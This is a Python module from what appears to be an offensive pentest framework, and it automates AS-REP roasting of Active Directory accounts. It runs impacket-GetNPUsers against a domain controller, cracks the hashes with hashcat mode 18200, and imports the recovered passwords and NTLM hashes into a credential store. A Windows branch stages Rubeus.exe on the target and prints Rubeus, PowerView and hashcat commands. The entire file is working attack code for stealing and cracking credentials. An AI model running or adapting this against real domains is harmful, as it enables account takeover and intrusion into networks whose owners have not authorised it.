PROVIDES = ["creds"]
REQUIRES = []


def run(data, cred, args):

    import subprocess

    from pathlib import Path

    from core.paths import get_artifacts_dir
    from core.runner import run_module_by_name
    from core.target import target_add_cred
    from core.target import print_creds_table
    from core.paths import get_tools_dir
    from modules.upload.windows import stage_windows_files

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'

    ip = data["ip"]
    domain = data["domain"]
    target = data["name"]

    
    if getattr(
        args,
        "windows",
        False
    ):
        
        print(
            f"\n{B}┌── WINDOWS REFERENCE ─────────────────────────────┐{W}"
            )

        print()

        print(
            f"{B}[?]{W} Transfer Rubeus?\n"
        )

        print(
            f"  {B}[1]{W} Yes"
        )

        print(
            f"  {B}[2]{W} No\n"
        )

        choice = input(
            f"{Y}Select> {W}"
        ).strip()

        if choice == "1":

            windows_tools = (
                get_tools_dir() /
                "windows"
            )

            rubeus = (
                windows_tools /
                "Rubeus.exe"
            )

            stage_windows_files([
                rubeus
            ])

        print()

        print(f"{W}# Enumerate roastable users{W}")
        print(
            f"{Y}"
            f"Rubeus.exe "
            f"asreproast "
            f"/nowrap "
            f"/format:hashcat"
            f"{W}"
        )

        print()

        print(f"{W}# Roast a specific user{W}")
        print(
            f"{Y}"
            f"Rubeus.exe "
            f"asreproast "
            f"/user:{C}<username>{Y} "
            f"/nowrap "
            f"/format:hashcat"
            f"{W}"
        )

        print()

        print(f"{W}# Enumerate DONT_REQ_PREAUTH with PowerView (optional){W}")
        print(
            f"{Y}"
            f"Get-DomainUser "
            f"-PreauthNotRequired | "
            f"Select samaccountname,userprincipalname,useraccountcontrol | fl"
            f"{W}"
        )

        print()

        print(f"{W}# Crack{W}")
        print(
            f"{Y}"
            f"hashcat -m 18200 asrep_hashes.txt <wordlist>"
            f"{W}"
        )

        print()

        print(
            f"{B}└──────────────────────────────────────────────────┘{W}\n"
        )

        return


    artifacts = get_artifacts_dir(target)

    hashes = artifacts / "asrep_hashes.txt"
    cracked = artifacts / "asrep_cracked.txt"

    #
    # Build GetNPUsers command
    #

    if cred:

        cmd = [
            "impacket-GetNPUsers",
            f"{domain}/{cred['user']}:{cred['secret']}",
            "-dc-ip",
            ip,
            "-request",
            "-format",
            "hashcat",
            "-outputfile",
            str(hashes),
        ]

    else:

        users = input(
            f"{Y}Userlist> {W}"
        ).strip()

        if not users:

            print(
                f"{R}[!] Missing userlist.{W}"
            )

            return

        cmd = [
            "GetNPUsers.py",
            f"{domain}/",
            "-dc-ip",
            ip,
            "-no-pass",
            "-usersfile",
            users,
            "-format",
            "hashcat",
            "-outputfile",
            str(hashes),
        ]

    #
    # Roast
    #

    print()

    print(
        f"{B}[*]{W} AS-REP Roasting..."
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    subprocess.run(cmd)

    if not hashes.exists() or hashes.stat().st_size == 0:

        print()

        print(
            f"{R}[-]{W} No AS-REP roastable users found."
        )

        print()

        return

    print()

    print(
        f"{G}[+]{W} Hashes saved:"
    )

    print(
        f"    {hashes}"
    )

    #
    # Crack
    #

    print()

    print(
        f"{B}[*]{W} Cracking hashes..."
    )

    run_module_by_name(
        "crack.hash",
        [
            str(hashes),
            "--mode",
            "18200",
            "--out",
            str(cracked),
            "--quiet",
        ],
        data,
    )

    if not cracked.exists() or cracked.stat().st_size == 0:

        print()

        print(
            f"{R}[-]{W} No passwords recovered."
        )

        print()

        return

    #
    # Parse
    #

    print()

    print(
        f"{B}[*]{W} Importing recovered credentials..."
    )

    new_creds = run_module_by_name(
        "parse.hash",
        [
            str(cracked),
        ],
        data,
    )

    if not new_creds:

        print()

        print(
            f"{R}[-]{W} No credentials parsed."
        )

        print()

        return

    import argparse

    print()

    print(
        f"{G}┌── RECOVERED CREDENTIALS ─────────────────────────┐{W}"
    )

    for c in new_creds:

        print(
            f"{G}│{W} {C}{c['user']:<22}{W} {Y}{c['secret']}{W}"
        )

        target_add_cred(
            argparse.Namespace(
                user=c["user"],
                password=c["secret"]
                if c["type"] == "password"
                else None,
                hash=c["secret"]
                if c["type"] == "ntlm"
                else None,
                aes=None,
                ccache=None,
            ),
            switch=False, show=False

        )
    print_creds_table()

    print(
        f"{G}└──────────────────────────────────────────────────┘{W}"
    )

    print()

    print(
        f"{G}[+]{W} Imported {len(new_creds)} credential(s)."
    )

    print()
